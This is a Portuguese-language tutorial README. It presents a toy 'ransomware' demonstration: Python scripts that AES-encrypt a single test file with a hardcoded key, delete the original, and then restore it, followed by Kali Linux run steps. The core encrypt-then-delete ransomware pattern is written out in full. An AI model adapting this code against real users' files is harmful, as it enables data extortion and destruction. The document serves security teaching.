
# Documentação do Projeto: Análise de Encrypter e Decrypter em Python

Este projeto consiste em dois scripts desenvolvidos em Python (`encrypter.py` e `decrypter.py`) que realizam a criptografia e descriptografia de um arquivo de texto (`teste.txt`). Os scripts foram desenvolvidos em um ambiente **Kali Linux** utilizando o editor de texto **NANO** e têm como objetivo demonstrar, de forma educacional, o funcionamento básico de um ransomware. 

⚠️ **Aviso Importante**: Este projeto é apenas um exercício educacional para fins de estudo na área de **cybersecurity**. Qualquer prática envolvendo ransomware é ilegal e antiética se realizada sem o consentimento explícito do proprietário dos dados. Nunca utilize scripts como esses para atividades ilícitas.

---

## Arquivos do Projeto

O projeto é composto pelos seguintes arquivos:

- `encrypter.py`: Script que criptografa o arquivo `teste.txt`.
- `decrypter.py`: Script que descriptografa o arquivo `teste.txt.ransomwaretroll`.
- `teste.txt`: Arquivo de texto simples utilizado para fins de demonstração.

---

## 1. Estrutura dos Arquivos Python

### 1.1 encrypter.py

Este script é responsável por criptografar o conteúdo do arquivo `teste.txt` e gerar um novo arquivo criptografado chamado `teste.txt.ransomwaretroll`. Vamos detalhar cada passo:

```python
import os
import pyaes

# Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")  # Abre o arquivo em modo de leitura binária
file_data = file.read()       # Lê o conteúdo do arquivo
file.close()                  # Fecha o arquivo

# Remover o arquivo original
os.remove(file_name)          # Deleta o arquivo original para que só exista o arquivo criptografado

# Chave de criptografia
key = b"testeransomwares"     # Chave usada para criptografar o arquivo (deve ter 16, 24 ou 32 bytes)
aes = pyaes.AESModeOfOperationCTR(key)  # Modo de operação AES em CTR (Counter)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)  # Realiza a criptografia do conteúdo do arquivo

# Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')   # Cria um novo arquivo para salvar os dados criptografados
new_file.write(crypto_data)           # Escreve os dados criptografados no novo arquivo
new_file.close()                      # Fecha o novo arquivo
```

### 1.2 decrypter.py

Este script realiza a descriptografia do arquivo criptografado gerado pelo `encrypter.py`, restaurando o arquivo original `teste.txt`.

```python
import os
import pyaes

# Abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")  # Abre o arquivo criptografado em modo de leitura binária
file_data = file.read()       # Lê o conteúdo criptografado do arquivo
file.close()                  # Fecha o arquivo

# Chave para descriptografia
key = b"testeransomwares"     # Mesma chave usada na criptografia para reverter o processo
aes = pyaes.AESModeOfOperationCTR(key)  # Modo de operação AES em CTR (Counter)
decrypt_data = aes.decrypt(file_data)   # Realiza a descriptografia dos dados

# Remover o arquivo criptografado
os.remove(file_name)          # Deleta o arquivo criptografado

# Criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")  # Cria um novo arquivo para restaurar os dados originais
new_file.write(decrypt_data)          # Escreve os dados descriptografados no novo arquivo
new_file.close()                      # Fecha o arquivo
```

---

## 2. Passo a Passo no Kali Linux

Para reproduzir este exercício em um ambiente Kali Linux, siga os passos abaixo:

1. **Criar o arquivo `teste.txt`**:
   - Abra o terminal e execute: `nano teste.txt`.
   - Insira algum texto de exemplo e salve o arquivo (`CTRL + O`, depois `ENTER` e `CTRL + X` para sair).

2. **Desenvolver os scripts `encrypter.py` e `decrypter.py`**:
   - Crie os arquivos `encrypter.py` e `decrypter.py` usando o NANO:
     ```bash
     nano encrypter.py
     ```
     ```bash
     nano decrypter.py
     ```
   - Copie e cole o código fornecido anteriormente em cada respectivo arquivo.

3. **Instalar a biblioteca `pyaes` se necessário**:
   - Caso a biblioteca `pyaes` não esteja instalada, utilize o comando:
     ```bash
     pip install pyaes
     ```

4. **Executar o script `encrypter.py`**:
   - No terminal, execute:
     ```bash
     python3 encrypter.py
     ```
   - Isso irá criptografar o arquivo `teste.txt` e gerar o arquivo `teste.txt.ransomwaretroll`.

5. **Executar o script `decrypter.py`**:
   - Para restaurar o arquivo original, execute:
     ```bash
     python3 decrypter.py
     ```

---

## 3. Considerações Finais

Este exercício ilustra de maneira simples como funcionam as operações de criptografia e descriptografia de dados. No entanto, o uso de ransomware para fins maliciosos é uma prática ilegal e antiética. Em um contexto real de **cybersecurity**, essas técnicas são usadas por profissionais para entender como proteger sistemas e desenvolver soluções de segurança.

Se você está estudando **cybersecurity**, entenda que o conhecimento deve ser usado para proteger e não para explorar vulnerabilidades.

---

## Recursos Adicionais

- [Documentação do PyAES](https://github.com/ricmoo/pyaes)
- [Práticas Éticas em Cybersecurity](https://www.eccouncil.org/)

---

**Nota**: Qualquer uso indevido do conhecimento apresentado nesta documentação será de total responsabilidade do usuário. O propósito é estritamente educacional.
